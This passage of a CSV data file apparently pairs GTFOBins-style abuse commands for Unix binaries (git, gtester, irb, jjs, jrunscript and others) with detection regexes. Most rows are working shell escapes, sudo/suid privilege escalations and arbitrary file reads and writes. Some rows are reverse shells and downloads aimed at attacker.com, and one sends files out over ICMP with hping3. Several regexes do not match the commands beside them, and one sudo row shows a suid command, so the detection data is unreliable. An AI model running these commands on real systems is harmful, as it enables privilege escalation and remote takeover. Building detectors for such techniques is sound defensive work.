!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,limited-suid,"./ginsh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,sudo,"sudo ginsh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
git,shell,"PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,shell,"git help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,shell,"git branch --help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),"The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,shell,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
git,shell,"ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,file-read,git diff /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is displayed in `diff` style output format.
git,file-write,git apply --unsafe-paths --directory / x.patch,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-unsafe\-paths\s*\-\-directory\s+.+),"The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`."
git,sudo,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,sudo,"sudo git -p help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-p\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,sudo,"sudo git branch --help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),"The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,sudo,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
git,sudo,"ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,limited-suid,"PAGER='sh -c ""exec sh 0<&1""' ./git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grc,shell,grc --pty /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grc,sudo,sudo grc --pty /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grep,file-read,grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,suid,./grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,sudo,sudo grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,file-write,"gtester ""DATA"" -o $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`)."
gtester,shell,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,sudo,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,suid,"echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -c $LFILE | gzip -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,suid,./gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,sudo,sudo gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,file-read,"hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,suid,"./hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,sudo,"sudo hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,file-read,"head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,suid,"./head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,sudo,"sudo head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,file-read,"hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,suid,"./hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,sudo,"sudo hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,file-read,"highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,suid,"./highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,sudo,"sudo highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hping3,shell,"hping3
/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+(?:/bin/(?:sh|bash))),
hping3,suid,"./hping3
/bin/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s*\-p\s+(?:/bin/(?:sh|bash))),
hping3,sudo,"sudo hping3
/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+(?:/bin/(?:sh|bash))),
hping3,sudo,"sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s*\-\-icmp\s*\-\-data\s*\-\-sign\s*\-\-file\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:

```
sudo hping3 --icmp --listen xxx --dump
```
"
iconv,file-write,"echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,file-read,"iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,suid,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,sudo,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iftop,shell,"iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
iftop,limited-suid,"./iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
iftop,sudo,"sudo iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
install,suid,./install -m 6777 $LFILE $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
install,sudo,sudo install -m 6777 $LFILE $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ionice,shell,ionice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+(?:/bin/(?:sh|bash))),
ionice,suid,./ionice /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s*\-p\s+(?:/bin/(?:sh|bash))),
ionice,sudo,sudo ionice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+(?:/bin/(?:sh|bash))),
ip,file-read,"ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,suid,"./ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,suid,"./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-p\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y.
ip,sudo,"sudo ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y.
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-s\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.
irb,shell,"irb
exec '/bin/bash'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:/bin/(?:sh|bash))),
irb,reverse-shell,"export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
irb,file-upload,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.+),Serve files in the local folder running an HTTP server on port 8888.
irb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
irb,file-write,"irb
File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
irb,file-read,"irb
puts File.read(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
irb,library-load,"irb
require ""fiddle""; Fiddle.dlopen(""lib.so"")",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.+),
irb,sudo,"sudo irb
exec '/bin/bash'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:/bin/(?:sh|bash))),
ispell,shell,"ispell /etc/passwd
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ispell\s+(?:/bin/(?:sh|bash))),
ispell,suid,"./ispell /etc/passwd
!/bin/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ispell\s*\-p\s+(?:/bin/(?:sh|bash))),
ispell,sudo,"sudo ispell /etc/passwd
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ispell\s+(?:/bin/(?:sh|bash))),
jjs,shell,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
jjs,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
var port=Java.type(""java.lang.System"").getenv(""RPORT"");
var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var Socket = Java.type(""java.net.Socket"");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
jjs,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo ""var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();"" | jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
jjs,file-write,"echo 'var FileWriter = Java.type(""java.io.FileWriter"");
var fw=new FileWriter(""./file_to_write"");
fw.write(""DATA"");
fw.close();' | jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jjs,file-read,"echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");
var FileReader = Java.type(""java.io.FileReader"");
var br = new BufferedReader(new FileReader(""file_to_read""));
while ((line = br.readLine()) != null) { print(line); }' | jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jjs,suid,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-p\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This has been found working in macOS but failing on Linux systems.
jjs,sudo,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
joe,shell,"joe
^K!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?joe\s+(?:/bin/(?:sh|bash))),
joe,limited-suid,"./joe
^K!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?joe\s+(?:/bin/(?:sh|bash))),
joe,sudo,"sudo joe
^K!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?joe\s+(?:/bin/(?:sh|bash))),
join,file-read,join -a 2 /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
join,suid,./join -a 2 /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
join,sudo,sudo join -a 2 /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
journalctl,shell,"journalctl
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?journalctl\s+(?:/bin/(?:sh|bash))),
journalctl,sudo,"sudo journalctl
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?journalctl\s+(?:/bin/(?:sh|bash))),
jq,file-read,"jq -Rr . ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jq,suid,"./jq -Rr . ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jq,sudo,"sudo jq -Rr . ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jrunscript,shell,"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
jrunscript,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';
var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
